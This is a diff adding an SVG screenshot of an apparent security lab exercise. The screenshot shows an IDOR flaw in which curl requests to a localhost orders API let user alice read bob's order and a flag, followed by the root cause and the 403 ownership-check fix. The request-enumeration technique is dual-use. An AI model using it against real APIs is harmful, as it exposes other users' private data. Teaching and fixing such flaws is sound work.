@@ -1,0 +1,17 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="880" height="300" font-family="'Menlo','Courier New',monospace" font-size="13">
+  <rect width="880" height="300" rx="8" fill="#1e1e2e"/>
+  <rect x="0" y="0" width="880" height="28" rx="8" fill="#313244"/>
+  <circle cx="16" cy="14" r="5" fill="#f38ba8"/><circle cx="32" cy="14" r="5" fill="#a6e3a1"/><circle cx="48" cy="14" r="5" fill="#f9e2af"/>
+  <text x="440" y="18" fill="#cdd6f4" text-anchor="middle" font-size="11">Task 1 — IDOR: alice reads bob's order (CWE-639)</text>
+  <text x="12" y="52" fill="#a6e3a1" font-size="12">$ printf '%s | %s | ' "$(whoami)" '6631503092'; date '+%F %T %Z'</text>
+  <text x="12" y="70" fill="#cdd6f4" font-size="12">thomas | 6631503092 | 2026-09-13 16:51:15 +07</text>
+  <text x="12" y="98" fill="#a6e3a1" font-size="12">$ curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"</text>
+  <text x="12" y="118" fill="#cdd6f4" font-size="12">{"item":"Laptop","owner":"alice","total":1200}   ← alice's own order</text>
+  <text x="12" y="148" fill="#a6e3a1" font-size="12">$ curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"</text>
+  <text x="12" y="168" fill="#f38ba8" font-size="12">{"item":"Phone","note":"FLAG{idor_demo}","owner":"bob","total":800}</text>
+  <text x="12" y="188" fill="#f38ba8" font-size="12">  ↑ BOB's order returned to ALICE — IDOR! No ownership check.</text>
+  <text x="12" y="220" fill="#585b70" font-size="11">Root cause: vulnerable_app.py L63 calls current_user() but ignores return value.</text>
+  <text x="12" y="240" fill="#585b70" font-size="11">No "if order['owner'] != user" check — any authenticated user reads any oid.</text>
+  <rect x="12" y="258" width="856" height="28" rx="3" fill="#45475a"/>
+  <text x="440" y="277" fill="#f9e2af" text-anchor="middle" font-size="11">Mitigation: solution_app.py L64 → if order["owner"] != user: return 403</text>
+</svg>
